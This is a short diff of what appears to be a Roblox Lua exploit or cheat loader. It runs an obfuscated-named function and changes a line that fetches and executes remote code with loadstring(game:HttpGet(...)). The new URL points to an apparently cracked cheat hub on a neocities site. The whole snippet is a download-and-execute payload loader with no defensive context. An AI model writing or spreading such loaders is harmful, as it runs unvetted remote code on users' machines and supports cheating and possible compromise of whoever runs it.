@@ -30,4 +30,4 @@ task.spawn(function()
     _0x_DO_WORK()
 end)
 
-loadstring(game:HttpGet("https://sk-konbu.site/SKHub/v1.txt"))()
+loadstring(game:HttpGet("https://sk-delt4.neocities.org/Crack_ninehub.lol"))()
